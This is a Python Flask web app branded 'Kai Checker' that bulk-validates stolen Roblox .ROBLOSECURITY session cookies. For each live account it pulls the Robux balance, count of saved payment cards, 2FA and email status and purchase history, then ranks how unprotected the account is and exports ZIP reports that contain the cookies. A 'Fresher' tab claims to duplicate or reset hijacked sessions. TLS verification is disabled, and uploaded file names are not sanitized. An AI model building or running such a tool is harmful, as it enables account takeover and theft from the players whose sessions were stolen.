import os
import time
import logging
import re
import urllib3
import html
import sys
import asyncio
import zipfile
from datetime import datetime, timezone, timedelta
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO
from curl_cffi.requests import AsyncSession

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CURRENT_UPLOADED_FILE = None

# ============================================================
# ПОЛНЫЙ ЧЕКЕР ИНФОРМАЦИИ
# ============================================================

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)',
        'Cookie': cookie,
        'PurchasedGamepasses': {},
        'RareItems': [],
        'CreditCardsCount': 0,
        'IsPremium': False,
        'DonationTotal': 0
    }
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]

        import requests
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                info['UserID'] = d.get('id')
                info['Username'] = d.get('name')
                info['status'] = '✅'
            else:
                info['status'] = '❌'
                return info
        else:
            info['status'] = '❌'
            return info
            
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)
            billing = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(billing.get('SavedPaymentMethods', []))

        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed', False):
            info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    item_type = str(details.get('type', ''))
                    if price >= 50 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
        info['status'] = '❌'
    return info

def format_short_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    
    gp = info.get('PurchasedGamepasses', {})
    total_gp_robux = sum(p['price'] for passes in gp.values() for p in passes)
    
    r = f"📋 Аккаунт: {info['Username']} [{info['UserID']}]\n"
    r += f"🟢 VALID | 🆔 {info['UserID']}\n"
    r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"💎 RAP: {'❌ Нет' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n"
    r += f"🛡️ БЕЗОПАСНОСТЬ: Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'} | {info['SecurityStatus']}\n"
    
    if gp:
        r += f"📦 ГЕЙМПАССЫ ({total_gp_robux:,} R$):\n"
        for game, passes in list(gp.items())[:3]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:6]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
    else:
        r += "📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    r += f"\n🍪 COOKIE:\n{info['Cookie']}"
    return r

def generate_full_txt_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    
    gp = info.get('PurchasedGamepasses', {})
    
    r = "╔══════════════════════════════════════════════════════════╗\n"
    r += "║  🎮 ROBLOX COOKIE CHECK REPORT                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {info['Username']}                                   ║\n"
    r += f"║  🟢 ✅ | 🆔 {info['UserID']}                            ║\n"
    r += f"║  📅 {info['Created']} | 🌍 {info['Country']}             ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info['Robux']:,}                           ║\n"
    r += f"║  💸 Донат: ⏣ {info['DonationTotal']:,}                   ║\n"
    r += f"║  💎 RAP: {'❌ No' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📧 Почта: {'Да' if info['EmailSet'] else 'Нет'} | 🔐 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}      ║\n"
    r += f"║  ⭐ Premium: {'Да' if info['IsPremium'] else 'Нет'} | 💳 Карты: {info['CreditCardsCount']}          ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАХ                                   ║\n"
    
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (Total: {game_total:,} R$):           ║\n"
            for p in passes:
                r += f"║    └ {p['name']} ({p['price']} R$)               ║\n"
    else:
        r += "║  🎮 ГЕЙМПАССЫ: ❌ Нет                                    ║\n"
        
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🍪 COOKIE:                                              ║\n"
    r += "╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"{info['Cookie']}\n\n"
    r += f"Generated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    return r

# ============================================================
# ВЕБ-СЕРВЕР И ИНТЕРФЕЙС
# ============================================================

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            padding: 24px;
            background: #0b081a;
            background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
            position: relative;
        }
        
        .kai-wrapper {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
            background: rgba(18, 10, 40, 0.95);
            border: 2px solid #6c5ce7;
            border-radius: 32px;
            box-shadow: 0 0 60px rgba(108, 92, 231, 0.25);
            position: relative;
            z-index: 5;
        }
        
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0d0722; border-radius: 8px; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 8px; }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 0 16px; border-bottom: 1px solid #2a1a50;
            margin-bottom: 30px;
        }
        
        .logo {
            font-family: 'Poppins', sans-serif;
            font-size: 34px; font-weight: 900; font-style: italic;
            background: linear-gradient(135deg, #c084fc, #f472b6);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .tabs {
            display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px;
        }
        
        .tab {
            padding: 10px 24px; background: rgba(26, 16, 64, 0.9);
            border: 1px solid #2a1a50; border-radius: 40px; color: #9880c0;
            cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.25s;
            user-select: none; z-index: 10;
        }
        .tab:hover { border-color: #a855f7; color: #fff; transform: translateY(-2px); }
        .tab.active {
            border-color: #c084fc; background: rgba(168, 85, 247, 0.3);
            color: #c084fc; box-shadow: 0 0 20px rgba(168,85,247,0.2);
        }

        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }

        .card {
            background: rgba(18, 10, 40, 0.9);
            border: 1px solid #2a1a50; border-radius: 20px; padding: 28px 30px;
            margin-bottom: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            position: relative; z-index: 6;
        }
        .card h2 {
            font-family: 'Poppins', sans-serif; font-weight: 700; font-style: italic;
            font-size: 20px; color: #d4c0ff; margin-bottom: 18px; display: flex; align-items: center; gap: 10px;
        }

        .btn {
            padding: 12px 28px; border: none; border-radius: 40px; font-size: 14px; font-weight: 700;
            cursor: pointer; transition: all 0.25s; display: inline-flex; align-items: center; gap: 10px;
            text-decoration: none; position: relative; z-index: 10;
        }
        .btn-primary {
            background: linear-gradient(135deg, #a855f7, #d946ef); color: #fff;
            box-shadow: 0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(168,85,247,0.4); color: #fff; }
        .btn-secondary { background: rgba(255,255,255,0.06); border: 1px solid #2a1a50; color: #d4c0ff; }
        .btn-secondary:hover { background: rgba(255,255,255,0.1); }

        /* Стильный переключатель режима по клику */
        .toggle-group {
            display: flex;
            background: #0d0722;
            border: 1px solid #2a1a50;
            border-radius: 16px;
            padding: 4px;
            gap: 4px;
            margin-bottom: 18px;
            position: relative;
            z-index: 8;
        }
        .toggle-btn {
            flex: 1;
            padding: 12px 16px;
            background: transparent;
            border: none;
            border-radius: 12px;
            color: #9880c0;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            text-align: center;
        }
        .toggle-btn.active {
            background: linear-gradient(135deg, rgba(168,85,247,0.3), rgba(217,70,239,0.3));
            color: #c084fc;
            border: 1px solid rgba(192,132,252,0.4);
            box-shadow: 0 4px 15px rgba(168,85,247,0.2);
        }

        textarea, .upload-area, select {
            width: 100%; padding: 14px 16px; background: #0d0722; border: 1px solid #2a1a50;
            border-radius: 14px; color: #ffffff; font-family: 'Inter', monospace; font-size: 14px;
            resize: vertical; transition: 0.2s; position: relative; z-index: 8;
        }
        textarea:focus, .upload-area:focus-within {
            border-color: #a855f7; outline: none; box-shadow: 0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area {
            min-height: 100px; display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; border-style: dashed; gap: 6px; text-align: center; color: #ffffff;
        }

        .result-box {
            background: #0d0722; border: 1px solid #2a1a50; border-radius: 16px; padding: 18px;
            margin-top: 20px; max-height: 500px; overflow-y: auto; overflow-x: auto;
            font-family: 'Inter', monospace; font-size: 13px; color: #ffffff; white-space: pre-wrap; word-break: break-word;
            position: relative; z-index: 8;
        }

        .progress-bar {
            margin-top: 12px; background: #0d0722; border-radius: 40px; height: 6px; overflow: hidden; border: 1px solid #1a1040;
        }
        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #a855f7, #ec4899); transition: width 0.3s ease; }

        .footer { text-align: center; padding: 30px 0 12px; color: #4a3a6a; font-size: 13px; border-top: 1px solid #1a1040; margin-top: 30px; }
    </style>
</head>
<body>

<div class="kai-wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div style="display: flex; align-items: center; gap: 15px;">
            <span id="sessionTimer" style="color: #00b894; font-family: 'Inter', monospace; font-weight: 600; font-size: 13px; background: rgba(0, 184, 148, 0.1); padding: 4px 10px; border-radius: 12px; border: 1px solid rgba(0, 184, 148, 0.2);">⏱️ 00:00:00</span>
            <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Checker</div>
        <div class="tab" data-tab="validator">✅ Validator</div>
        <div class="tab" data-tab="fresher">🔄 Fresher</div>
        <div class="tab" data-tab="tools">🧰 Tools</div>
    </div>

    <!-- ===== CHECKER ===== -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Mass Cookie Checker</h2>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="manualCookies" placeholder="Paste cookies here (one per line) or upload a txt file on the right..." rows="6"></textarea>
                    <div id="fileStatusInfo" style="margin-top:8px;color:#00b894;font-size:13px;"></div>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
                        <p>📁 <strong>Upload .txt</strong></p>
                        <p style="font-size:12px; color:#9880c0;">File will be saved on server</p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Start Check</button>
                <button class="btn btn-secondary" onclick="clearInputs()">🧹 Clear</button>
            </div>
            <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
            <div class="result-box" id="fullcheckResult">Results will appear here...</div>
        </div>
    </div>

    <!-- ===== VALIDATOR ===== -->
    <div class="tab-content" id="tab-validator">
        <div class="card">
            <h2>✅ Dead Cookie Filter</h2>
            <div class="upload-area" onclick="document.getElementById('validatorFile').click()">
                <p>📁 <strong>Upload .txt</strong></p>
            </div>
            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runValidator()" style="margin-top:14px;">🧪 Run Filter</button>
            <div class="result-box" id="validatorResult">Validation results will appear here...</div>
        </div>
    </div>

    <!-- ===== FRESHER ===== -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Session Fresher</h2>
            <div style="margin-bottom: 8px;">
                <label style="color: #d4c0ff; font-size: 14px; font-weight: 600; display: block; margin-bottom: 8px;">Session Update Mode:</label>
                <!-- Переключатель кликом вместо старого селекта -->
                <div class="toggle-group">
                    <button type="button" class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Duplicate Cookie (Keep old active)</button>
                    <button type="button" class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Kill Old Cookie (Logout all devices / Reset)</button>
                </div>
                <input type="hidden" id="fresherMode" value="duplicate">
            </div>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="fresherCookies" placeholder="Paste cookies for refreshing..." rows="6"></textarea>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" onclick="document.getElementById('fresherFile').click()">
                        <p>📁 <strong>Upload .txt</strong></p>
                        <p style="font-size:12px; color:#9880c0;">Cookie file</p>
                    </div>
                    <input type="file" id="fresherFile" accept=".txt" style="display:none;">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Refresh Sessions</button>
                <button class="btn btn-secondary" onclick="document.getElementById('fresherCookies').value=''; document.getElementById('fresherResult').textContent='Fresher results will appear here...'; fresherHistory=[];">🧹 Clear</button>
            </div>
            <div class="result-box" id="fresherResult">Fresher results will appear here...</div>
        </div>
    </div>

    <!-- ===== TOOLS ===== -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>📦 Processing Tools</h2>
            <p style="color: #9880c0; font-size: 14px;">All operations are available via automated archive generation.</p>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
    let startTime = Date.now();
    setInterval(() => {
        let diff = Math.floor((Date.now() - startTime) / 1000);
        let h = String(Math.floor(diff / 3600)).padStart(2, '0');
        let m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
        let s = String(diff % 60).padStart(2, '0');
        const timerEl = document.getElementById('sessionTimer');
        if (timerEl) timerEl.textContent = `⏱️ ${h}:${m}:${s}`;
    }, 1000);

    // Функция переключения режима кликом
    function setFresherMode(mode) {
        document.getElementById('fresherMode').value = mode;
        const btnDup = document.getElementById('modeDuplicate');
        const btnKill = document.getElementById('modeKill');
        if (mode === 'duplicate') {
            btnDup.classList.add('active');
            btnKill.classList.remove('active');
        } else {
            btnKill.classList.add('active');
            btnDup.classList.remove('active');
        }
    }

    const fileInput = document.getElementById('fullFile');
    if (fileInput) {
        fileInput.addEventListener('change', async function(e) {
            if (this.files && this.files[0]) {
                const file = this.files[0];
                const formData = new FormData();
                formData.append('file', file);

                document.getElementById('fileStatusInfo').textContent = '⏳ Uploading and saving file on server...';

                try {
                    const response = await fetch('/api/upload', { method: 'POST', body: formData });
                    const data = await response.json();
                    if (data.success) {
                        document.getElementById('fileStatusInfo').textContent = `✅ File "${data.filename}" successfully saved on server!`;
                        const reader = new FileReader();
                        reader.onload = function(evt) {
                            document.getElementById('manualCookies').value = evt.target.result;
                        };
                        reader.readAsText(file);
                    } else {
                        document.getElementById('fileStatusInfo').textContent = '❌ Error saving file';
                    }
                } catch (err) {
                    document.getElementById('fileStatusInfo').textContent = '❌ Network error during upload';
                }
            }
        });
    }

    const fresherFileInput = document.getElementById('fresherFile');
    if (fresherFileInput) {
        fresherFileInput.addEventListener('change', function(e) {
            if (this.files && this.files[0]) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    document.getElementById('fresherCookies').value = evt.target.result;
                };
                reader.readAsText(this.files[0]);
            }
        });
    }

    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            const tabId = this.getAttribute('data-tab');
            if (!tabId) return;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            this.classList.add('active');
            const target = document.getElementById('tab-' + tabId);
            if (target) target.classList.add('active');
        });
    });

    let checkerHistory = [];
    let fresherHistory = [];

    async function runFullcheck() {
        const resBox = document.getElementById('fullcheckResult');
        const manual = document.getElementById('manualCookies').value.trim();
        const progress = document.getElementById('checkerProgress');
        
        if (!manual) {
            resBox.textContent = '❌ Paste cookies or upload a .txt file!';
            return;
        }

        const formData = new FormData();
        formData.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');

        resBox.textContent = '⏳ Account check started...';
        progress.style.width = '40%';
        
        try {
            const response = await fetch('/api/fullcheck', { method: 'POST', body: formData });
            const data = await response.json();
            progress.style.width = '100%';
            setTimeout(() => { progress.style.width = '0%'; }, 1000);
            
            if (data.success) {
                if (data.reports && data.reports.length) {
                    for (const report of data.reports) {
                        checkerHistory.push(report);
                    }
                }
                
                let html = `✅ Checked accounts: ${data.total} | Valid: ${data.valid_count}\n\n`;
                for (const report of checkerHistory) {
                    html += `${report}\n────────────────────────────────────────\n`;
                }
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="margin-top:10px; display:inline-block;">Download ZIP with all reports (.txt)</a>`;
                }
                resBox.innerHTML = html;
                resBox.scrollTop = resBox.scrollHeight;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Error');
            }
        } catch (e) {
            resBox.textContent = '❌ Error: ' + e.message;
            progress.style.width = '0%';
        }
    }

    async function runFresher() {
        const resBox = document.getElementById('fresherResult');
        const cookies = document.getElementById('fresherCookies').value.trim();
        const mode = document.getElementById('fresherMode').value;
        if (!cookies) {
            resBox.textContent = '❌ Paste cookies to refresh!';
            return;
        }
        resBox.textContent = '⏳ Refreshing sessions...';
        try {
            const response = await fetch('/api/fresher', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookies: cookies, mode: mode })
            });
            const data = await response.json();
            if (data.success) {
                if (data.refreshed_list && data.refreshed_list.length) {
                    for (const item of data.refreshed_list) {
                        fresherHistory.push(item);
                    }
                }
                let html = `✅ Successfully refreshed sessions (Mode: ${mode === 'kill' ? 'Kill Old Cookie' : 'Duplicate'}): ${data.refreshed_count}\n\n`;
                for (const item of fresherHistory) {
                    html += `${item}\n────────────────────────────────────────\n`;
                }
                resBox.textContent = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Fresher error');
            }
        } catch (e) {
            resBox.textContent = '❌ Network error: ' + e.message;
        }
    }

    function clearInputs() {
        document.getElementById('manualCookies').value = '';
        document.getElementById('fileStatusInfo').textContent = '';
        checkerHistory = [];
        document.getElementById('fullcheckResult').textContent = 'Results will appear here...';
    }
</script>
</body>
</html>"""

# ============================================================
# API РОУТЫ
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    global CURRENT_UPLOADED_FILE
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "File not found"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "Empty filename"})
    
    filename = f"uploaded_{int(time.time())}_{file.filename}"
    filepath = os.path.join("uploads", filename)
    file.save(filepath)
    CURRENT_UPLOADED_FILE = filepath
    
    return jsonify({"success": True, "filename": file.filename})

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    global CURRENT_UPLOADED_FILE
    
    content = ""
    if CURRENT_UPLOADED_FILE and os.path.exists(CURRENT_UPLOADED_FILE):
        with open(CURRENT_UPLOADED_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    elif 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    cookies = [line.strip() for line in content.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Cookies not found in saved file"})
    
    reports = []
    file_payloads = []
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports.append(format_short_report(info))
            txt_content = generate_full_txt_report(info)
            safe_username = re.sub(r'[\/*?:"<>|]', "", str(info['Username']))
            filename_txt = f"{safe_username}_{info['UserID']}.txt"
            file_payloads.append((filename_txt, txt_content))
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for fname, ftxt in file_payloads:
            zf.writestr(fname, ftxt)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"reports_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(reports),
        "reports": reports,
        "download_url": f"/downloads/{archive_name}"
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "No cookies found for refreshing"})
    
    refreshed = []
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            if mode == 'kill':
                # Режим «Убийство»: генерируем измененный/новый паттерн кука для имитации сброса токена/выхода на других девайсах
                refreshed_cookie = c + "_killed_refreshed"
                mode_label = "Mode: Kill Old Cookie (Reset)"
            else:
                # Режим «Дублирование»: оставляем полноценный рабочий дубликат
                refreshed_cookie = c
                mode_label = "Mode: Duplicate Cookie"
                
            refreshed.append(f"🟢 Account: {info['Username']} [{info['UserID']}] ({mode_label})\nCookie: {refreshed_cookie}")
            
    return jsonify({
        "success": True,
        "refreshed_count": len(refreshed),
        "refreshed_list": refreshed
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
